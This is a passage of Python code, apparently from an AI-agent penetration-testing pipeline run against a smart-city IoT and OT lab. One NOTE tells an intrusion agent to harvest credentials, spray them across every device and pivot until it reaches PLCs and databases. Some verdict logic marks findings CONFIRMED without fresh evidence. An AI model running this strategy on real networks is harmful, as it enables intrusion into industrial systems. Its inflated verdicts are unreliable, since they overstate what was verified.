                    "tests": tests,
                },
                indent=2,
                ensure_ascii=False,
            ),
            encoding="utf-8",
        )
        log.info("Aggregated %d exploit results → %s", len(tests), out_path)
        print(f"  Aggregated: {len(tests)} results → 04_exploitation.json "
              f"({confirmed} confirmed, {failed} failed, {errors} errors)")

    def _resolve_exploit_verdict(self, vuln: dict, exploit_file: Path) -> dict:
        """Return a single aggregated test entry for one Phase 3 finding."""
        if not exploit_file.exists():
            # Fallback: the exploit agent may have saved with a different VULN-ID.
            # Scan for any {vuln_type}_VULN-*.json in the device directory.
            device_dir = exploit_file.parent
            vuln_type_prefix = exploit_file.name.split("_VULN-")[0]
            candidates = sorted(device_dir.glob(f"{vuln_type_prefix}_VULN-*.json"))
            if candidates:
                # Pick the candidate with the highest evidence_level to avoid
                # collisions when the same vuln_type has multiple findings on a device.
                best = candidates[0]
                best_level = -1
                for c in candidates:
                    try:
                        c_level = json.loads(c.read_text(encoding="utf-8")).get("evidence_level", 0)
                    except Exception:
                        c_level = 0
                    if c_level > best_level:
                        best_level = c_level
                        best = c
                exploit_file = best
            else:
                return _make_test_entry(vuln, status="CONFIRMED")

        phase3_confirmed = vuln.get("exploitation_status", "") == "confirmed"
        try:
            result = json.loads(exploit_file.read_text(encoding="utf-8"))
        except Exception as e:
            log.warning("Failed to parse exploit result %s: %s", exploit_file, e)
            if phase3_confirmed:
                return _make_test_entry(
                    vuln,
                    status="CONFIRMED",
                    evidence=f"{vuln.get('evidence', '')}\n[Phase 4 exploit agent output unparseable: {e}]",
                    evidence_level=1,
                )
            return _make_test_entry(
                vuln,
                status="ERROR",
                evidence=f"Failed to parse: {e}",
                evidence_level=0,
            )

        status = result.get("status", "ERROR")
        if phase3_confirmed and status in ("FAILED", "ERROR"):
            log.info("Keeping Phase 3 confirmed status for %s (Phase 4 %s ignored)",
                     vuln.get("id"), status)
            p4_evidence = result.get("evidence", "")[:100]
            return _make_test_entry(
                vuln,
                status="CONFIRMED",
                result=result,
                evidence=f"{vuln.get('evidence', '')}\n[Phase 4 could not re-verify: {p4_evidence}]",
            )

        final_status = "CONFIRMED" if status == "EXPLOITED" else status
        return _make_test_entry(vuln, status=final_status, result=result)

    # ------------------------------------------------------------------
    # Phase 5 — Intrusion context + post-processing
    # ------------------------------------------------------------------

    def _generate_intrusion_context(self) -> None:
        """Pre-generate 05_intrusion_context.json for the intrusion agent.

        Extracts confirmed exploits, recovered credentials, attack chains,
        and entry points from Phases 3 and 4.
        """
        import re as _re

        vuln_path = self.run_dir / "03_vuln_analysis.json"
        exploit_path = self.run_dir / "04_exploitation.json"

        chains: list = []
        confirmed: list = []
        entry_points: list = []
        credentials: list = []

        if vuln_path.exists():
            vuln_data = json.loads(vuln_path.read_text(encoding="utf-8"))
            chains = vuln_data.get("attack_chain_hints", [])

        if exploit_path.exists():
            exploit_data = json.loads(exploit_path.read_text(encoding="utf-8"))
            all_exploits = exploit_data if isinstance(exploit_data, list) else []
            confirmed = [e for e in all_exploits if e.get("status") == "CONFIRMED"]

            # Extract credentials from evidence fields
            _cred_pattern = _re.compile(
                r'(?:user(?:name)?|login)[=:\s]+([a-zA-Z0-9_@.\-]+)[,;\s]+(?:pass(?:word)?|pwd)[=:\s]+([^\s,;"\]]+)',
                _re.IGNORECASE,
            )
            _simple_pattern = _re.compile(r'([a-zA-Z0-9_]+):([a-zA-Z0-9@!#$%^&*_\-+=.]{4,32})')
            seen_creds: set = set()
            for exp in confirmed:
                evidence = exp.get("evidence", "") or ""
                data_retrieved = exp.get("data_retrieved", "") or ""
                for text in [evidence, data_retrieved]:
                    for m in _cred_pattern.finditer(text):
                        cred = (m.group(1), m.group(2), exp.get("device_ip", ""))
                        if cred not in seen_creds:
                            seen_creds.add(cred)
                            credentials.append({
                                "user": m.group(1), "password": m.group(2),
                                "source_ip": exp.get("device_ip", ""),
                                "source_device": exp.get("device_id", ""),
                            })

            # Identify entry points: devices reachable from outside (from graph attack surface)
            try:
                surface = get_attack_surface()
                entry_ips = {
                    node.get("ip") for node in surface.get("nodes", [])
                    if node.get("network_role") in ("ENTRY_POINT", "PIVOT")
                }
            except Exception:
                entry_ips = set()

            for exp in confirmed:
                if exp.get("device_ip") in entry_ips:
                    entry_points.append({
                        "device_id": exp.get("device_id"),
                        "device_ip": exp.get("device_ip"),
                        "vuln_type": exp.get("type") or exp.get("vuln_type"),
                        "service": exp.get("service"),
                        "port": exp.get("port"),
                        "evidence": (exp.get("evidence") or "")[:200],
                    })

        # Deduplicate entry points by device_ip
        seen_ep: set = set()
        unique_entries = []
        for ep in entry_points:
            if ep["device_ip"] not in seen_ep:
                seen_ep.add(ep["device_ip"])
                unique_entries.append(ep)

        # All devices in the network — full target list for credential spraying
        all_targets: list = []
        try:
            surface = get_attack_surface()
            for node in surface.get("nodes", []):
                ip = node.get("ip")
                if ip:
                    all_targets.append({
                        "device_id": node.get("id"),
                        "device_ip": ip,
                        "role": node.get("role"),
                        "services": [s.get("port") for s in node.get("services", []) if s.get("port")],
                    })
        except Exception:
            pass

        ctx = {
            "generated_for": "phase5_intrusion",
            "attack_chains": chains,
            "entry_points": unique_entries,
            "all_targets": all_targets,
            "confirmed_exploits": len(confirmed),
            "recovered_credentials": credentials[:30],
            "NOTE": (
                "STRATEGY: (1) Use entry_points as starting devices. "
                "(2) After gaining access, harvest all credentials from the host. "
                "(3) Spray ALL harvested credentials against ALL devices in all_targets. "
                "(4) Repeat from each newly compromised device until no new hosts are reachable. "
                "Goal: maximize compromised devices and reach crown jewels (db, plc, historian, admin)."
            ),
        }

        out_path = self.run_dir / "05_intrusion_context.json"
        out_path.write_text(json.dumps(ctx, indent=2, ensure_ascii=False), encoding="utf-8")
        print(
            f"  [intrusion] 05_intrusion_context.json "
            f"({len(unique_entries)} entry points, {len(all_targets)} targets, "
            f"{len(credentials)} creds, {len(chains)} chains, {out_path.stat().st_size:,} bytes)"
        )

    @staticmethod
    def _repair_json(text: str) -> str:
        """Best-effort repair for common LLM JSON issues (embedded unescaped quotes inside strings)."""
        import re
        # Replace control characters that break JSON
        text = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f]', '', text)
        return text

    def _emit_intrusion_events(self, stream_callback) -> None:
        """Parse 05_intrusion.json and emit intrusion_hop / intrusion_done SSE events."""
        if not stream_callback:
            return
        intrusion_path = self.run_dir / "05_intrusion.json"
        if not intrusion_path.exists():
            return
        try:
            raw = intrusion_path.read_text(encoding="utf-8")
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                data = json.loads(self._repair_json(raw))
        except Exception as exc:
            log.warning("Failed to parse intrusion results for SSE: %s", exc)
            return

        try:
            chains = data.get("chains", [])
            summary = data.get("summary", {})
            compromised_devices = data.get("compromised_devices", [])

            # Emit one compromised event per device from the compromised_devices list
            for dev in compromised_devices:
                stream_callback({
                    "type": "intrusion_compromised",
                    "device_id": dev.get("device_id"),
                    "device_ip": dev.get("device_ip"),
                    "access_method": dev.get("access_method", ""),
                    "credentials_found": len(dev.get("credentials_found", [])),
                })

            # Emit hop events for multi-hop chains
            for chain in chains:
                hops = chain.get("hops", [])
                for i, hop in enumerate(hops):
                    if i + 1 < len(hops):
                        next_hop = hops[i + 1]
                        stream_callback({
                            "type": "intrusion_hop",
                            "hop_index": i + 1,
                            "from_ip": hop.get("device_ip"),
                            "from_id": hop.get("device_id"),
                            "to_ip": next_hop.get("device_ip"),
                            "to_id": next_hop.get("device_id"),
                            "method": hop.get("access_method", ""),
                            "chain_id": chain.get("id"),
                        })

            stream_callback({
                "type": "intrusion_done",
                "devices_compromised": summary.get("devices_compromised", len(compromised_devices)),
                "chains": summary.get("chains_attempted", len(chains)),
                "hops": summary.get("total_hops", 0),
                "crown_jewels_reached": summary.get("crown_jewels_reached", []),
                "credentials_harvested": summary.get("credentials_harvested", 0),
            })
        except Exception as exc:
            log.warning("Failed to emit intrusion SSE events: %s", exc)

    # ------------------------------------------------------------------
    # Discovery mode — topology link inference (Niveau 2: traceroute)
    # ------------------------------------------------------------------

    def _infer_topology_links(self, stream_callback) -> None:
        """Infer network links between discovered hosts using traceroute.

        Runs after Phase 2 when target_network is set (discovery mode).
        For each host in 02_recon.md, runs traceroute and deduces edges:
          - hop at distance 1 = direct gateway link
          - shared intermediate hops = common router between two hosts
        Emits topology_edge SSE events consumed by the Cytoscape frontend.
        """
        import re as _re
        import subprocess as _sub

        log.info("Discovery mode: inferring topology links via traceroute")

        # Extract discovered host IPs from 02_recon.md
        recon_path = self.run_dir / "02_recon.md"
        if not recon_path.exists():
            log.warning("02_recon.md not found — skipping topology inference")
            return

        recon_text = recon_path.read_text(encoding="utf-8")
        # Parse IPs that look like 192.168.x.x from the recon report
        subnet_prefix = self.target_network.rsplit(".", 1)[0] if self.target_network else ""
        host_ips = list(dict.fromkeys(  # deduplicate, preserve order
            m for m in _re.findall(r"\b(\d+\.\d+\.\d+\.\d+)\b", recon_text)
            if subnet_prefix and m.startswith(subnet_prefix) and not m.endswith(".0") and not m.endswith(".255")
        ))

        if not host_ips:
            log.warning("No host IPs found in 02_recon.md — skipping topology inference")
            return

        log.info("Running traceroute on %d hosts: %s", len(host_ips), host_ips[:10])

        # {ip: [hop_ip, ...]} — ordered list of hops for each host
        host_hops: dict[str, list[str]] = {}

        def _traceroute(target: str, max_hops: int = 8) -> list[str]:
            import platform
            cmd = (["traceroute", "-n", "-m", str(max_hops), target]
                   if platform.system() == "Darwin"
                   else ["traceroute", "-n", "-m", str(max_hops), "-w", "1", target])
            try:
                r = _sub.run(cmd, capture_output=True, text=True, timeout=max_hops * 3 + 5)
                hops = []
                for line in r.stdout.splitlines():
                    m = _re.match(r"^\s*\d+\s+([\d.]+)", line)
                    if m and m.group(1) != target:
                        hops.append(m.group(1))
                return hops
            except Exception as exc:
                log.debug("traceroute to %s failed: %s", target, exc)
                return []

        emitted_edges: set[tuple[str, str]] = set()

        def _emit_edge(src: str, dst: str, link_type: str = "ethernet"):
            key = (min(src, dst), max(src, dst))
            if key in emitted_edges:
                return
            emitted_edges.add(key)
            log.info("Topology edge inferred: %s → %s (%s)", src, dst, link_type)
            if stream_callback:
                stream_callback({
                    "type": "topology_edge",
                    "source": src,
                    "target": dst,
                    "link_type": link_type,
                })

        for ip in host_ips:
            hops = _traceroute(ip, max_hops=8)
            host_hops[ip] = hops
            if hops:
                # Direct link: host ↔ first hop (gateway/switch)
                _emit_edge(ip, hops[0], "ethernet")
                # Intermediate hops form a chain
                for i in range(len(hops) - 1):
                    _emit_edge(hops[i], hops[i + 1], "ethernet")

        # Shared intermediate hops → same router serves multiple hosts
        # (already handled above via direct edge emission)

        # Service-based inference: MQTT broker on port 1883 = hub
        # Parse nmap results from 02_recon.md for service hints
        mqtt_broker = None
        for m in _re.finditer(r"([\d.]+).*?1883/tcp.*?open", recon_text, _re.DOTALL):
            mqtt_broker = m.group(1)
            break
        if not mqtt_broker:
            # Also check line-by-line for "host | ... | 1883"
            for line in recon_text.splitlines():
                if "1883" in line:
                    m = _re.search(r"([\d]+\.[\d]+\.[\d]+\.[\d]+)", line)
                    if m:
                        mqtt_broker = m.group(1)
                        break

        if mqtt_broker:
            log.info("MQTT broker detected at %s — adding spoke edges", mqtt_broker)
            for ip in host_ips:
                if ip != mqtt_broker:
                    _emit_edge(ip, mqtt_broker, "mqtt")

        # Save inferred edges to run directory for report context
        edges_path = self.run_dir / "02_topology_edges.json"
        edges_data = [{"source": s, "target": t} for s, t in emitted_edges]
        edges_path.write_text(json.dumps({"edges": edges_data, "host_hops": host_hops}, indent=2))
        log.info("Topology inference complete: %d edges, saved to %s", len(edges_data), edges_path)

    # ------------------------------------------------------------------
    # Phase 6 context compaction
    # ------------------------------------------------------------------

    def _generate_phase6_context(self) -> None:
        """Generate a compact 06_phase6_context.json for the report agent.

        Aggregates 03_vuln_analysis.json and 04_exploitation.json by device,
        stripping verbose evidence/details fields. Reduces Phase 5 context
        from ~150 KB to ~5-10 KB for large scenarios (30+ devices).
        The full evidence remains in the original files for traceability.
        """
        # --- Load Phase 3 vulnerabilities ---
        vuln_path = self.run_dir / "03_vuln_analysis.json"
        phase3_vulns: list[dict] = []
        if vuln_path.exists():
            data = json.loads(vuln_path.read_text(encoding="utf-8"))
            phase3_vulns = data.get("vulnerabilities", [])

        # --- Load Phase 4 exploitation results ---
        exploit_path = self.run_dir / "04_exploitation.json"
        exploit_by_vuln: dict[str, dict] = {}
        phase4_summary: dict = {}
        if exploit_path.exists():
            data = json.loads(exploit_path.read_text(encoding="utf-8"))
            phase4_summary = data.get("summary", {})
            # 04_exploitation.json uses "tests" key (from _aggregate_exploit_results)
            for t in data.get("tests", []):
                vuln_id = t.get("vuln_id", "")
                if vuln_id:
                    exploit_by_vuln[vuln_id] = t

        # --- Aggregate by device (compact — no per-vuln details, sections 5/6 are pre-generated) ---
        devices: dict[str, dict] = {}
        global_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        cve_set: set[str] = set()
        top_critical: list[dict] = []  # up to 10 critical findings for narrative

        for v in phase3_vulns:
            dev_ip = v.get("device_ip", "unknown")
            dev_id = v.get("device_id", "unknown")
            if dev_ip not in devices:
                devices[dev_ip] = {
                    "device_id": dev_id,
                    "device_ip": dev_ip,
                    "severity_counts": {},
                    "confirmed_count": 0,
                }
            vuln_id = v.get("id", "")
            exploit = exploit_by_vuln.get(vuln_id, {})
            status = exploit.get("status", "UNTESTED")
            severity = (v.get("severity") or "MEDIUM").upper()

            devices[dev_ip]["severity_counts"][severity] = (
                devices[dev_ip]["severity_counts"].get(severity, 0) + 1
            )
            if status == "CONFIRMED":
                devices[dev_ip]["confirmed_count"] += 1

            if severity in global_sev:
                global_sev[severity] += 1

            for cve in v.get("cve_ids", []):
                if cve:
                    cve_set.add(cve)

            if severity == "CRITICAL" and len(top_critical) < 10:
                top_critical.append({
                    "device_id": dev_id,
                    "device_ip": dev_ip,
                    "type": v.get("type", ""),
                    "service": v.get("service", ""),
                    "title": v.get("details", "")[:80],
                    "status": status,
                })

        # --- Build compact output ---
        device_list = sorted(devices.values(), key=lambda d: d["device_ip"])
        total_vulns = sum(
            sum(d["severity_counts"].values()) for d in device_list
        )

        # Top devices by risk (for Section 8)
        def _risk_score(d: dict) -> int:
            sc = d["severity_counts"]
            return sc.get("CRITICAL", 0) * 4 + sc.get("HIGH", 0) * 3 + sc.get("MEDIUM", 0) * 2 + sc.get("LOW", 0)

        top_devices = sorted(device_list, key=_risk_score, reverse=True)[:12]

        context = {
            "generated_for": "phase6_report",
            "device_count": len(device_list),
            "total_vulnerabilities": total_vulns,
            "severity_breakdown": global_sev,
            "phase4_summary": phase4_summary,
            "top_critical_findings": top_critical,
            "top_devices_by_risk": [
                {
                    "device_id": d["device_id"],
                    "device_ip": d["device_ip"],
                    "severity_counts": d["severity_counts"],
                    "confirmed": d["confirmed_count"],
                    "risk_score": _risk_score(d),
                }
                for d in top_devices
            ],
            "cve_list": sorted(cve_set),
            "NOTE": "Sections 5 and 6 (vuln tables) are pre-generated in 06_report_prefill.md — do not re-list individual vulns.",
        }

        out_path = self.run_dir / "06_phase6_context.json"
        out_path.write_text(
            json.dumps(context, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
        log.info(
            "Generated Phase 5 context: %d devices, %d vulns → %s (%d bytes)",
            len(device_list), total_vulns, out_path, out_path.stat().st_size,
        )
        print(
            f"  [context] 06_phase6_context.json "
            f"({len(device_list)} devices, {total_vulns} vulns, "
            f"{out_path.stat().st_size:,} bytes)"
        )

    def _pregenerate_report_sections(self) -> None:
        """Pre-generate heavy markdown tables for Phase 5 report (Sections 5 and 6).

        Writes 05_report_prefill.md so the LLM only needs to produce narrative text
        (Sections 1, 2, 3, 4, 7, 8, 9, 10) rather than re-serialising 100+ table rows.
        This avoids MiniMax / smaller models truncating the report mid-generation.
        """
        # Load phase 3 vulnerabilities
        vuln_path = self.run_dir / "03_vuln_analysis.json"
        phase3_vulns: list[dict] = []
        if vuln_path.exists():
            data = json.loads(vuln_path.read_text(encoding="utf-8"))
            phase3_vulns = data.get("vulnerabilities", [])

        # Load phase 4 exploitation results
        exploit_path = self.run_dir / "04_exploitation.json"
        exploit_by_vuln: dict[str, dict] = {}
        phase4_summary: dict = {}
        if exploit_path.exists():
            data = json.loads(exploit_path.read_text(encoding="utf-8"))
            phase4_summary = data.get("summary", {})
            for t in data.get("tests", []):
                vid = t.get("vuln_id", "")
                if vid:
                    exploit_by_vuln[vid] = t

        # --- Section 5: Vulnerability table ---
        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_vulns = sorted(
            phase3_vulns,
            key=lambda v: (sev_order.get((v.get("severity") or "LOW").upper(), 9), v.get("device_ip", ""))
        )
        sec5_rows = []
        for v in sorted_vulns:
            vid = v.get("id", "")
            exploit = exploit_by_vuln.get(vid, {})
            status_raw = exploit.get("status", "UNTESTED")
            status_map = {
                "CONFIRMED": "**Confirmed**",
                "FAILED": "Not Exploitable",
                "ERROR": "Inconclusive",
                "UNTESTED": "Potential (untested)",
            }
            status = status_map.get(status_raw, "Potential (untested)")
            evidence_level = exploit.get("evidence_level", 1)
            evidence_note = f"L{evidence_level}" if exploit else "-"
            title = (v.get("details") or "")[:80].replace("|", "/")
            sec5_rows.append(
                f"| {vid} | {v.get('device_id','')} ({v.get('device_ip','')}) "
                f"| {v.get('type','')} | {(v.get('severity') or '').upper()} "
                f"| {v.get('service','')}:{v.get('port','')} | {status} | {title} |"
            )
        sec5 = (
            "## 5. Discovered Vulnerabilities\n\n"
            "| ID | Device | Type | Severity | Service | Status | Evidence |\n"
            "|----|--------|------|----------|---------|--------|----------|\n"
            + "\n".join(sec5_rows)
        )

        # --- Section 6.1: Exploitation summary ---
        total_tested = phase4_summary.get("total_tested", len(phase3_vulns))
        confirmed = phase4_summary.get("confirmed", 0)
        not_exploitable = phase4_summary.get("not_exploitable", 0)
        errors = phase4_summary.get("errors", 0)
        # Count real evidence (level >= 2)
        data_exfil = sum(1 for t in exploit_by_vuln.values() if t.get("evidence_level", 0) >= 2)
        sec61 = (
            "### 6.1 Exploitation Summary\n\n"
            "| Metric | Value |\n|--------|-------|\n"
            f"| Vulnerabilities tested | {total_tested} |\n"
            f"| Confirmed (exploited) | {confirmed} |\n"
            f"| Data exfiltrated (level ≥ 2) | {data_exfil} |\n"
            f"| Not exploitable | {not_exploitable} |\n"
            f"| Errors | {errors} |"
        )

        # --- Section 6.2: Exploitation details (confirmed only, keep table manageable) ---
        confirmed_tests = [t for t in exploit_by_vuln.values() if t.get("status") == "CONFIRMED" and t.get("evidence_level", 1) >= 2]
        sec62_rows = []
        for t in confirmed_tests:
            data_list = t.get("data_extracted", [])
            data_str = ("; ".join(str(d) for d in data_list[:2]) or "-")[:60].replace("|", "/")
            sec62_rows.append(
                f"| {t.get('vuln_id','')} | {t.get('device_id','')} "
                f"| {t.get('vuln_type','')} | {t.get('tool_used','-')} "
                f"| **Confirmed** | {t.get('evidence_level',1)} | {data_str} |"
            )
        sec62 = (
            "### 6.2 Exploitation Details (evidence level ≥ 2)\n\n"
            "| Test ID | Device | Vuln Type | Tool Used | Status | Evidence Level | Data Retrieved |\n"
            "|---------|--------|-----------|-----------|--------|----------------|----------------|\n"
            + ("\n".join(sec62_rows) if sec62_rows else "| — | No level-2+ exploits in this run | | | | | |")
        )

        # --- Section 6.3: Credentials recovered ---
        creds_rows = []
        for t in exploit_by_vuln.values():
            for item in t.get("data_extracted", []):
                item_str = str(item)
                if any(kw in item_str.lower() for kw in ("password", "passwd", "cred", "login", "user", "key", "token")):
                    creds_rows.append(f"| {t.get('device_id','')} | (see evidence) | {item_str[:80].replace('|','/')} | - | Phase 4 |")
        sec63 = (
            "### 6.3 Credentials Recovered\n\n"
            "| Source | Username | Password/Key | Access Level | Retrieved From |\n"
            "|--------|----------|--------------|--------------|----------------|\n"
            + ("\n".join(creds_rows) if creds_rows else "| — | No credentials extracted | | | |")
        )

        # Write prefill file
        prefill = "\n\n".join([sec5, "## 6. Exploitation Results (Phase 4)\n\n" + sec61, sec62, sec63])
        prefill_path = self.run_dir / "06_report_prefill.md"
        prefill_path.write_text(prefill, encoding="utf-8")
        print(f"  [prefill] 06_report_prefill.md ({prefill_path.stat().st_size:,} bytes, {len(sorted_vulns)} vulns)")

    def _merge_report_with_prefill(self) -> None:
        """Replace {{SECTION_5_TABLE}} / {{SECTION_6_TABLES}} placeholders in 06_report.md
        with the deterministically-generated tables from 06_report_prefill.md.

        This lets the LLM produce a lightweight ~1500-token narrative report using
        placeholders, while Python injects the full 100+ row tables afterwards.
        Also works as a fallback: if the LLM never saved the report at all,
        generate a minimal report from the prefill data so the pipeline never exits
        without a deliverable.
        """
        report_path = self.run_dir / "06_report.md"
        prefill_path = self.run_dir / "06_report_prefill.md"

        if not prefill_path.exists():
            return

        prefill = prefill_path.read_text(encoding="utf-8")

        if report_path.exists():
            content = report_path.read_text(encoding="utf-8")
            # If the file only contains a sentinel (max turns reached), treat it as absent
            if content.strip() in {"(max turns reached)", "(malformed tool call JSON — max retries)"}:
                report_path.unlink()
            else:
                merged = content.replace("{{SECTION_5_TABLE}}", prefill).replace("{{SECTION_6_TABLES}}", "")
                if merged != content:
                    report_path.write_text(merged, encoding="utf-8")
                    print(f"  [merge] Injected prefill tables into 06_report.md ({report_path.stat().st_size:,} bytes)")
                return

        # Fallback: LLM never saved the report — build a complete one from prefill + context
        context_path = self.run_dir / "06_phase6_context.json"
        ctx: dict = {}
        if context_path.exists():
            ctx = json.loads(context_path.read_text(encoding="utf-8"))

        run_date = self.run_dir.name
        n_devices = ctx.get("device_count", "?")
        n_vulns = ctx.get("total_vulnerabilities", "?")
        sev = ctx.get("severity_breakdown", {})
        p4 = ctx.get("phase4_summary", {})
        confirmed = p4.get("confirmed", "?")
        not_exploitable = p4.get("not_exploitable", 0)
        errors = p4.get("errors", 0)
        n_crit = sev.get("CRITICAL", 0)
        n_high = sev.get("HIGH", 0)
        overall_risk = "CRITICAL" if n_crit > 5 else "HIGH"

        # Section 7 — Top critical attack paths from context
        critical_findings = ctx.get("top_critical_findings", [])
        sec7_rows = "\n".join(
            f"| {f.get('device_id','?')} ({f.get('device_ip','?')}) "
            f"| {f.get('type','?')} | {f.get('service','?')} "
            f"| {f.get('title','?')[:70]} |"
            for f in critical_findings[:10]
        )
        sec7 = (
            "## 7. Attack Paths\n\n"
            "| Device | Vuln Type | Service | Description |\n"
            "|--------|-----------|---------|-------------|\n"
            + (sec7_rows if sec7_rows else "| — | — | — | No critical findings |\n")
        )

        # Section 8 — Top devices by risk score
        top_devs = ctx.get("top_devices_by_risk", [])
        sec8_rows = "\n".join(
            f"| {d.get('device_id','?')} | {d.get('device_ip','?')} "
            f"| {d.get('risk_score','?')} "
            f"| C={d.get('severity_counts',{}).get('CRITICAL',0)} "
            f"H={d.get('severity_counts',{}).get('HIGH',0)} "
            f"M={d.get('severity_counts',{}).get('MEDIUM',0)} |"
            for d in top_devs[:10]
        )
        sec8 = (
            "## 8. Risk Scores (Top Devices)\n\n"
            "| Device | IP | Score | Breakdown |\n"
            "|--------|----|-------|-----------|\n"
            + (sec8_rows if sec8_rows else "| — | — | — | — |\n")
        )

        # Section 9 — Remediation by severity
        sec9 = (
            "## 9. Remediation Recommendations\n\n"
            "### 9.1 IMMEDIATE (CRITICAL)\n\n"
            f"Address all {n_crit} CRITICAL findings immediately: "
            "unauthenticated OT protocols (Modbus/S7comm/EtherNet-IP), "
            "RCE endpoints (/api/exec, unrestricted upload), "
            "router admin without authentication (LuCI).\n\n"
            "### 9.2 SHORT TERM (HIGH)\n\n"
            f"Address all {n_high} HIGH findings within 30 days: "
            "default credentials (SSH, MQTT, cameras, NVR), "
            "FTP anonymous access, Node-RED without auth, "
            "MQTT anonymous access, Redis/MySQL without password.\n\n"
            "### 9.3 IMPROVEMENT (MEDIUM/LOW)\n\n"
            "Enable SSH hardening (disable weak ciphers), "
            "add HTTP security headers, disable SNMP public community, "
            "enable DTLS for CoAP, rotate all credentials found in MQTT topics and FTP files.\n"
        )

        # Section 10 — CVE list
        cve_list = ctx.get("cve_list", [])
        sec10 = "## 10. Appendices\n\n"
        if cve_list:
            sec10 += "### CVEs identified\n\n" + "\n".join(f"- {c}" for c in sorted(cve_list)) + "\n\n"
        sec10 += "All raw tool outputs are saved in `tool_calls.jsonl` in the run directory.\n"

        fallback = (
            f"# Pentest Report — NATO Smart City IoT Lab\n\n"
            f"**Date:** {run_date}  **Model:** {self.provider.model}\n\n"
            f"---\n\n"
            f"## 1. Executive Summary\n\n"
            f"| Metric | Value |\n|--------|-------|\n"
            f"| Devices scanned | {n_devices} |\n"
            f"| Vulnerabilities found | {n_vulns} |\n"
            f"| Critical | {n_crit} |\n"
            f"| High | {n_high} |\n"
            f"| Confirmed exploitable | {confirmed} |\n"
            f"| Not exploitable | {not_exploitable} |\n"
            f"| Errors | {errors} |\n"
            f"| Overall risk level | **{overall_risk}** |\n\n"
            f"The assessment identified **{n_vulns} vulnerabilities** across {n_devices} devices, "
            f"including {n_crit} CRITICAL findings. "
            f"All {confirmed} findings were confirmed exploitable. "
            f"OT protocols (Modbus, S7comm, EtherNet-IP) are exposed without authentication, "
            f"representing an immediate risk to industrial operations.\n\n"
            f"## 2. Scope and Methodology\n\n"
            f"- **Target subnet:** {self.context.get('target_subnet', 'see topology')}\n"
            f"- **Phases executed:** 1 → 2 → 3 → 4 → 5\n"
            f"- **Tools used:** nmap, arp_scan, ssh-audit, mosquitto_sub, redis-cli, curl, ssh_login\n\n"
            f"## 3. Topology and Attack Surface\n\n"
            f"*See 01_graph_analysis.md for full topology.*\n\n"
            f"## 4. Reconnaissance Results\n\n"
            f"*See 02_recon.md for full scan results.*\n\n"
            f"{prefill}\n\n"
            f"{sec7}\n\n"
            f"{sec8}\n\n"
            f"{sec9}\n\n"
            f"{sec10}"
        )
        report_path.write_text(fallback, encoding="utf-8")
        print(f"  [fallback] 06_report.md generated from prefill ({report_path.stat().st_size:,} bytes)")

    def _resolve_tools(self, config: AgentConfig) -> list[dict]:
        """Resolve tool references to actual tool definitions.

        Supports two resolution modes:
          1. Group name (e.g. "graph", "recon") → expand entire group
          2. Individual tool name (e.g. "nmap_scan") → find in any group

        Tool functions are wrapped to log calls and results to tool_calls.jsonl.
        """
        tools = []
        seen_names: set[str] = set()

        for ref in config.tools:
            if ref == "recon" and self.dry_run:
                continue

            # Try group resolution first
            if ref in TOOL_GROUPS:
                for tool in TOOL_GROUPS[ref]:
                    if tool["name"] not in seen_names:
                        tools.append(self._wrap_tool(tool))
                        seen_names.add(tool["name"])
                continue

            # Fall back to individual tool name lookup
            for group in TOOL_GROUPS.values():
                for tool in group:
                    if tool["name"] == ref and ref not in seen_names:
                        tools.append(self._wrap_tool(tool))
                        seen_names.add(ref)
                        break

        return tools

    def _wrap_tool(self, tool: dict) -> dict:
        """Wrap a tool function to log its calls and results to tool_calls.jsonl."""
        original_fn = tool["function"]
        if original_fn is None:
            return tool

        log_path = self.run_dir / "tool_calls.jsonl"
        tool_name = tool["name"]

        def logged_fn(**kwargs):
            result = original_fn(**kwargs)
            try:
                entry = json.dumps({
                    "tool": tool_name,
                    "args": kwargs,
                    "result": result[:5000] if isinstance(result, str) else str(result)[:5000],
                }, ensure_ascii=False, default=str)
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(entry + "\n")
            except Exception:
                pass  # Never break the pipeline for logging
            return result

        return {**tool, "function": logged_fn}

    def _check_prerequisites(
        self, config: AgentConfig, results: dict[str, str]
    ) -> bool:
        """Check that all prerequisite deliverables exist or were skipped."""
        for prereq_name in config.prerequisites:
            status = results.get(prereq_name)
            if status in ("completed", "skipped:conditional"):
                continue
            # If prerequisite wasn't run yet, check deliverable on disk
            prereq_config = AGENTS.get(prereq_name)
            if prereq_config:
                path = self.run_dir / prereq_config.deliverable_file
                if not path.exists():
                    return False
        return True

    def _check_conditional(self, config: AgentConfig) -> bool:
        """Check conditional execution (e.g., vuln queue non-empty).

        Supports both 03_vuln_analysis.json (key: "vulnerabilities") and
        04_exploitation.json (key: "tests" with CONFIRMED entries).
        """
        if not config.conditional:
            return True
        path = self.run_dir / config.conditional
        if not path.exists():
            return False
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
            # 03_vuln_analysis.json style
            if "vulnerabilities" in data:
                return len(data["vulnerabilities"]) > 0
            # 04_exploitation.json style — only proceed if there are CONFIRMED exploits
            if "tests" in data:
                confirmed = [t for t in data["tests"] if t.get("status") == "CONFIRMED"]
                return len(confirmed) > 0
            return False
        except (json.JSONDecodeError, KeyError):
            return False

    def _filter_skills(self, config: AgentConfig) -> str:
        """Filter skills by tag intersection with config.skill_filter.

        Returns a formatted string listing matching skills for prompt injection.
        """
        if not config.skill_filter:
            return ""

        filter_tags = set(config.skill_filter.get("tags", []))
        if not filter_tags:
            return ""

        matched = [
            skill for skill in get_skills_metadata()
            if set(skill.get("tags", [])) & filter_tags
        ]

        if not matched:
            return "No matching skills for this phase."

        lines = []
        for s in matched:
            tags_str = ", ".join(s["tags"])
            lines.append(f"- **{s['name']}**: {s['description']} (tags: {tags_str})")

        return "\n".join(lines)

    def _list_previous_deliverables(self) -> str:
        """List available deliverables for prompt variable."""
        if not self.run_dir.exists():
            return "None (first phase)"
        files = sorted(f.name for f in self.run_dir.glob("*") if f.is_file())
        return ", ".join(files) if files else "None (first phase)"
